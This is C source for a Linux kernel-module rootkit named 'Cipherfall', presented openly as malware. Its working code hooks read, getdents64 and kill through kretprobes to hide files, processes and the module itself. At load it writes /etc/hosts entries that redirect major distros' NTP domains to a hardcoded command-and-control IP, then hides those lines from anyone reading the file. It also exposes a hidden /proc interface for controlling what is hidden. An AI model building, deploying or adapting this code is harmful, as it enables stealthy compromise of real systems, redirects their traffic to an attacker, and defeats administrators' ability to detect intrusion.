/*
 * rootkit.c — Cipherfall LKM Rootkit
 *
 * Capabilities:
 *   - Hides files and directories whose names start with HIDE_FILE_PREFIX
 *     ("rootkit_" by default) from any getdents64 directory listing.
 *   - Hides additional files or directories by exact name, managed at runtime
 *     via the /proc/rootkit_ctrl write-only control interface.
 *   - Hides processes by PID: numeric entries in /proc/ are removed from
 *     directory listings and any signal to those PIDs returns -ESRCH.
 *   - Self-hides at init: removes itself from the module linked list (lsmod,
 *     /proc/modules) and from the kobject tree (/sys/module/).
 *   - Injects NTP C2 redirect entries into /etc/hosts at load time, pointing
 *     every major distro's default NTP domain (ntp.ubuntu.com,
 *     0.arch.pool.ntp.org, etc.) to C2_IP (87.106.187.97). These entries are
 *     hidden from any read() of /etc/hosts so they are invisible to cat, less,
 *     text editors, and any userspace tool that reads the file via the read(2)
 *     syscall. mmap()-based readers are not filtered (see limitations).
 *
 * Hooking mechanism — kretprobes (Linux 4.x+):
 *   Prior approach (syscall table patching) broke on Linux 6.1+ with
 *   CONFIG_MITIGATION_SPECTRE_BHI=y: do_syscall_64 now calls x64_sys_call()
 *   — a compiled direct-dispatch table — bypassing sys_call_table entirely.
 *   kretprobes are the modern standard: they instrument function prologues
 *   via the kprobe breakpoint mechanism, surviving all syscall table hardening.
 *   Probed symbols: __x64_sys_read, __x64_sys_getdents64, __x64_sys_kill.
 *
 * Kernel compatibility:
 *   >= 5.7 : kallsyms_lookup_name() unexported; address recovered at runtime
 *            via a kprobe registered on the symbol name (CONFIG_KPROBES=y req).
 *   < 5.7  : kallsyms_lookup_name() is an exported symbol; used directly.
 *
 * Hooked functions:
 *   __x64_sys_getdents64  — filters file and process directory entries.
 *   __x64_sys_kill        — returns -ESRCH for signals to hidden PIDs.
 *   __x64_sys_read        — filters lines containing HOSTS_MARKER from reads
 *                           of /etc/hosts, hiding the injected C2 entries.
 *
 * Control interface (/proc/rootkit_ctrl — write-only, itself hidden):
 *   echo "hide_pid <PID>"     > /proc/rootkit_ctrl
 *   echo "unhide_pid <PID>"   > /proc/rootkit_ctrl
 *   echo "hide_file <name>"   > /proc/rootkit_ctrl
 *   echo "unhide_file <name>" > /proc/rootkit_ctrl
 *
 * Limitations:
 *   - No persistence: state and hooks are lost on reboot; /etc/hosts entries
 *     survive reboot but are no longer hidden (re-load the module).
 *   - After self-hiding, rmmod cannot find the module; hooks survive until
 *     reboot (intentional — operator must reboot to fully unload).
 *   - /proc/<pid>/exe still points to the real binary for root processes.
 *   - File hiding is listing-only; direct inode access by full path works.
 *   - Hiding a directory does not hide its contents when accessed by path.
 *   - If CONFIG_KPROBES=n the module will refuse to load.
 *   - pread64() and mmap() of /etc/hosts are not filtered.
 *   - kretprobe maxactive limits concurrent instances; excess calls are missed.
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/ptrace.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dcache.h>
#include <asm/unistd.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
# define USE_KPROBES_KALLSYMS
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t real_kallsyms_lookup_name;
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Cipherfall");
MODULE_DESCRIPTION("Cipherfall LKM Rootkit");
MODULE_VERSION("1.0");

#define HIDE_FILE_PREFIX  "rootkit_"
#define CTRL_PROC_NAME    "rootkit_ctrl"
#define MAX_HIDDEN_PIDS   64
#define MAX_HIDDEN_FILES  64
#define MAX_FILENAME_LEN  256
#define KRP_MAXACTIVE     32

#define C2_IP            "87.106.187.97"
#define HOSTS_MARKER     C2_IP
#define HOSTS_MARKER_LEN 13
#define HOSTS_ENTRIES \
	C2_IP " ntp.ubuntu.com\n"           \
	C2_IP " 0.debian.pool.ntp.org\n"   \
	C2_IP " 2.fedora.pool.ntp.org\n"   \
	C2_IP " 0.rhel.pool.ntp.org\n"     \
	C2_IP " 0.centos.pool.ntp.org\n"   \
	C2_IP " 0.arch.pool.ntp.org\n"     \
	C2_IP " 0.opensuse.pool.ntp.org\n" \
	C2_IP " 0.pool.ntp.org\n"

/* ── hidden PID list ──────────────────────────────────────────────────────── */
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int   n_hidden_pids;
static DEFINE_SPINLOCK(pids_lock);

/* ── hidden filename list ─────────────────────────────────────────────────── */
static char  hidden_files[MAX_HIDDEN_FILES][MAX_FILENAME_LEN];
static int   n_hidden_files;
static DEFINE_SPINLOCK(files_lock);

/* ── kallsyms resolution ──────────────────────────────────────────────────── */
#ifdef USE_KPROBES_KALLSYMS
static int resolve_kallsyms(void)
{
	static struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name",
	};
	int rc = register_kprobe(&kp);
	if (rc < 0)
		return rc;
	real_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);
	return 0;
}
# define ksym(name) real_kallsyms_lookup_name(name)
#else
# define ksym(name) kallsyms_lookup_name(name)
#endif

/* ── PID list helpers ─────────────────────────────────────────────────────── */
static void pid_add(pid_t pid)
{
	unsigned long flags;
	spin_lock_irqsave(&pids_lock, flags);
	if (n_hidden_pids < MAX_HIDDEN_PIDS)
		hidden_pids[n_hidden_pids++] = pid;
	spin_unlock_irqrestore(&pids_lock, flags);
}

static void pid_remove(pid_t pid)
{
	unsigned long flags;
	int i;
	spin_lock_irqsave(&pids_lock, flags);
	for (i = 0; i < n_hidden_pids; i++) {
		if (hidden_pids[i] == pid) {
			hidden_pids[i] = hidden_pids[--n_hidden_pids];
			break;
		}
	}
	spin_unlock_irqrestore(&pids_lock, flags);
}

static bool pid_is_hidden(pid_t pid)
{
	unsigned long flags;
	int i;
	bool found = false;
	spin_lock_irqsave(&pids_lock, flags);
	for (i = 0; i < n_hidden_pids && !found; i++)
		found = (hidden_pids[i] == pid);
	spin_unlock_irqrestore(&pids_lock, flags);
	return found;
}

/* ── file list helpers ────────────────────────────────────────────────────── */
static void fname_add(const char *name)
{
	unsigned long flags;
	spin_lock_irqsave(&files_lock, flags);
	if (n_hidden_files < MAX_HIDDEN_FILES)
		strncpy(hidden_files[n_hidden_files++], name, MAX_FILENAME_LEN - 1);
	spin_unlock_irqrestore(&files_lock, flags);
}

static void fname_remove(const char *name)
{
	unsigned long flags;
	int i;
	spin_lock_irqsave(&files_lock, flags);
	for (i = 0; i < n_hidden_files; i++) {
		if (strncmp(hidden_files[i], name, MAX_FILENAME_LEN) == 0) {
			if (i < n_hidden_files - 1)
				memmove(hidden_files[i], hidden_files[i + 1],
				        (n_hidden_files - i - 1) * MAX_FILENAME_LEN);
			n_hidden_files--;
			break;
		}
	}
	spin_unlock_irqrestore(&files_lock, flags);
}

/* ── dirent filter ────────────────────────────────────────────────────────── */
static bool dirent_is_hidden(const char *name)
{
	unsigned long flags;
	const char *p;
	pid_t pid;
	bool is_pid;
	int i;

	if (!name || !*name)
		return false;

	if (strncmp(name, HIDE_FILE_PREFIX, strlen(HIDE_FILE_PREFIX)) == 0)
		return true;

	spin_lock_irqsave(&files_lock, flags);
	for (i = 0; i < n_hidden_files; i++) {
		if (strncmp(hidden_files[i], name, MAX_FILENAME_LEN) == 0) {
			spin_unlock_irqrestore(&files_lock, flags);
			return true;
		}
	}
	spin_unlock_irqrestore(&files_lock, flags);

	pid    = 0;
	is_pid = (*name != '\0');
	for (p = name; *p && is_pid; p++) {
		if (*p < '0' || *p > '9')
			is_pid = false;
		else
			pid = pid * 10 + (*p - '0');
	}

	return is_pid && pid_is_hidden(pid);
}

/* ── /etc/hosts read filtering ────────────────────────────────────────────── */
static bool fd_is_hosts(unsigned int fd)
{
	struct file *filp;
	char *buf;
	char *path;
	bool result = false;

	filp = fget(fd);
	if (!filp)
		return false;

	buf = kmalloc(256, GFP_KERNEL);
	if (!buf) {
		fput(filp);
		return false;
	}

	path = d_path(&filp->f_path, buf, 256);
	if (!IS_ERR(path) && strstr(path, "/etc/hosts") != NULL)
		result = true;

	kfree(buf);
	fput(filp);
	return result;
}

static long filter_hosts_buf(char __user *ubuf, long count)
{
	char *kbuf;
	char *p, *end, *out, *eol;
	size_t line_len;
	bool hidden;
	long new_count;
	int i;

	kbuf = kmalloc(count, GFP_KERNEL);
	if (!kbuf)
		return count;

	if (copy_from_user(kbuf, ubuf, count)) {
		kfree(kbuf);
		return count;
	}

	p   = kbuf;
	end = kbuf + count;
	out = kbuf;

	while (p < end) {
		eol = memchr(p, '\n', end - p);
		if (eol)
			line_len = (size_t)(eol - p) + 1;
		else
			line_len = (size_t)(end - p);

		hidden = false;
		if (line_len >= HOSTS_MARKER_LEN) {
			for (i = 0; i <= (int)(line_len - HOSTS_MARKER_LEN); i++) {
				if (memcmp(p + i, HOSTS_MARKER, HOSTS_MARKER_LEN) == 0) {
					hidden = true;
					break;
				}
			}
		}

		if (!hidden) {
			if (out != p)
				memmove(out, p, line_len);
			out += line_len;
		}

		p += line_len;
	}

	new_count = out - kbuf;
	if (new_count > 0 && copy_to_user(ubuf, kbuf, new_count))
		new_count = count;

	kfree(kbuf);
	return new_count;
}

/* ── kretprobe: __x64_sys_read ────────────────────────────────────────────── */
struct read_data {
	unsigned int    fd;
	char __user    *buf;
};

static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	const struct pt_regs *uregs = (const struct pt_regs *)regs->di;
	struct read_data *d         = (struct read_data *)ri->data;
	d->fd  = (unsigned int)uregs->di;
	d->buf = (char __user *)uregs->si;
	return 0;
}

static int read_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *d = (struct read_data *)ri->data;
	long ret            = regs_return_value(regs);

	if (ret > 0 && fd_is_hosts(d->fd)) {
		long nr = filter_hosts_buf(d->buf, ret);
		regs_set_return_value(regs, nr);
	}
	return 0;
}

static struct kretprobe rp_read = {
	.kp.symbol_name = "__x64_sys_read",
	.entry_handler  = read_entry,
	.handler        = read_ret,
	.data_size      = sizeof(struct read_data),
	.maxactive      = KRP_MAXACTIVE,
};

/* ── kretprobe: __x64_sys_getdents64 ──────────────────────────────────────── */
struct gd64_data {
	struct linux_dirent64 __user *dirent;
};

static int gd64_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	const struct pt_regs *uregs = (const struct pt_regs *)regs->di;
	struct gd64_data *d         = (struct gd64_data *)ri->data;
	d->dirent = (struct linux_dirent64 __user *)uregs->si;
	return 0;
}

static int gd64_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gd64_data *d = (struct gd64_data *)ri->data;
	long ret            = regs_return_value(regs);
	char *kbuf, *walk, *end, *out;
	long new_ret;

	if (ret <= 0)
		return 0;

	kbuf = kmalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, d->dirent, ret)) {
		kfree(kbuf);
		return 0;
	}

	walk    = kbuf;
	end     = kbuf + ret;
	out     = kbuf;
	new_ret = 0;

	while (walk < end) {
		struct linux_dirent64 *de = (struct linux_dirent64 *)walk;
		if (!de->d_reclen)
			break;
		if (!dirent_is_hidden(de->d_name)) {
			if (out != walk)
				memmove(out, walk, de->d_reclen);
			out     += de->d_reclen;
			new_ret += de->d_reclen;
		}
		walk += de->d_reclen;
	}

	if (copy_to_user(d->dirent, kbuf, new_ret))
		new_ret = ret;

	kfree(kbuf);
	regs_set_return_value(regs, new_ret);
	return 0;
}

static struct kretprobe rp_gd64 = {
	.kp.symbol_name = "__x64_sys_getdents64",
	.entry_handler  = gd64_entry,
	.handler        = gd64_ret,
	.data_size      = sizeof(struct gd64_data),
	.maxactive      = KRP_MAXACTIVE,
};

/* ── kretprobe: __x64_sys_kill ────────────────────────────────────────────── */
static int kill_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	const struct pt_regs *uregs = (const struct pt_regs *)regs->di;
	*(pid_t *)ri->data = (pid_t)uregs->di;
	return 0;
}

static int kill_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	pid_t pid = *(pid_t *)ri->data;
	if (pid_is_hidden(pid))
		regs_set_return_value(regs, -ESRCH);
	return 0;
}

static struct kretprobe rp_kill = {
	.kp.symbol_name = "__x64_sys_kill",
	.entry_handler  = kill_entry,
	.handler        = kill_ret,
	.data_size      = sizeof(pid_t),
	.maxactive      = KRP_MAXACTIVE,
};

/* ── /proc/rootkit_ctrl write interface ───────────────────────────────────── */
static ssize_t ctrl_write(struct file *file, const char __user *buf,
                          size_t count, loff_t *ppos)
{
	char kbuf[320];
	char cmd[32], arg[MAX_FILENAME_LEN];

	if (count >= sizeof(kbuf))
		return -EINVAL;
	if (copy_from_user(kbuf, buf, count))
		return -EFAULT;
	kbuf[count] = '\0';

	if (sscanf(kbuf, "%31s %255s", cmd, arg) != 2)
		return -EINVAL;

	if (strcmp(cmd, "hide_pid") == 0) {
		int v;
		if (kstrtoint(arg, 10, &v) == 0)
			pid_add((pid_t)v);
	} else if (strcmp(cmd, "unhide_pid") == 0) {
		int v;
		if (kstrtoint(arg, 10, &v) == 0)
			pid_remove((pid_t)v);
	} else if (strcmp(cmd, "hide_file") == 0) {
		fname_add(arg);
	} else if (strcmp(cmd, "unhide_file") == 0) {
		fname_remove(arg);
	}

	return count;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static const struct proc_ops ctrl_pops = {
	.proc_write = ctrl_write,
};
#else
static const struct file_operations ctrl_fops = {
	.owner = THIS_MODULE,
	.write = ctrl_write,
};
#endif

/* ── self-hide ────────────────────────────────────────────────────────────── */
static void module_selfhide(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	THIS_MODULE->sect_attrs  = NULL;
	THIS_MODULE->notes_attrs = NULL;
}

/* ── /etc/hosts injection ─────────────────────────────────────────────────── */
static void inject_hosts(void)
{
	struct file *filp;
	loff_t pos;
	const char *entry = HOSTS_ENTRIES;

	filp = filp_open("/etc/hosts", O_WRONLY | O_APPEND, 0);
	if (IS_ERR(filp))
		return;

	pos = vfs_llseek(filp, 0, SEEK_END);
	kernel_write(filp, entry, strlen(entry), &pos);
	filp_close(filp, NULL);
}

/* ── module init / exit ───────────────────────────────────────────────────── */
static int __init rootkit_init(void)
{
	int rc;

#ifdef USE_KPROBES_KALLSYMS
	if (resolve_kallsyms() < 0) {
		pr_err("rootkit: kprobe lookup for kallsyms_lookup_name failed\n");
		return -EINVAL;
	}
#endif

	inject_hosts();

	rc = register_kretprobe(&rp_read);
	if (rc < 0) {
		pr_err("rootkit: register rp_read failed: %d\n", rc);
		return rc;
	}

	rc = register_kretprobe(&rp_gd64);
	if (rc < 0) {
		pr_err("rootkit: register rp_gd64 failed: %d\n", rc);
		unregister_kretprobe(&rp_read);
		return rc;
	}

	rc = register_kretprobe(&rp_kill);
	if (rc < 0) {
		pr_err("rootkit: register rp_kill failed: %d\n", rc);
		unregister_kretprobe(&rp_gd64);
		unregister_kretprobe(&rp_read);
		return rc;
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
	proc_create(CTRL_PROC_NAME, 0222, NULL, &ctrl_pops);
#else
	proc_create(CTRL_PROC_NAME, 0222, NULL, &ctrl_fops);
#endif

	module_selfhide();
	return 0;
}

static void __exit rootkit_exit(void)
{
	unregister_kretprobe(&rp_kill);
	unregister_kretprobe(&rp_gd64);
	unregister_kretprobe(&rp_read);
	remove_proc_entry(CTRL_PROC_NAME, NULL);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
